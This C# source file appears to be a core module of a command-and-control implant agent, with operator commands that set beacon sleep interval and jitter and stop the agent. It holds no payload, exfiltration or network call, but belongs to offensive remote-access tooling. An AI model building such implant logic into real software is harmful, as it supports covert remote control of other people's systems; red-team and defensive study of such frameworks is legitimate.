using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;
using Shared.Utilities;

using System;
using System.Linq;
using System.Collections.Generic;

namespace Agent.Modules
{
    public class CoreAgentModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Core",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Sleep",
                        Delegate = SetSleep
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Exit",
                        Delegate = ExitAgent
                    }
                }
            };
        }

        void SetSleep(string AgentID, C2Data C2Data)
        {
            try
            {
                var sleep = Shared.Utilities.Utilities.DeserialiseData<SleepModel>(C2Data.Data);

                var interval = (int)sleep.Command.Parameters.FirstOrDefault(p => p.Name.Equals("Interval", StringComparison.OrdinalIgnoreCase)).Value;
                var jitter = (int)sleep.Command.Parameters.FirstOrDefault(p => p.Name.Equals("Jitter", StringComparison.OrdinalIgnoreCase)).Value;

                Config.Set(AgentConfig.SleepInterval, interval);
                Config.Set(AgentConfig.SleepJitter, jitter);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExitAgent(string AgentID, C2Data C2Data)
        {
            Agent.Stop();
        }
    }
}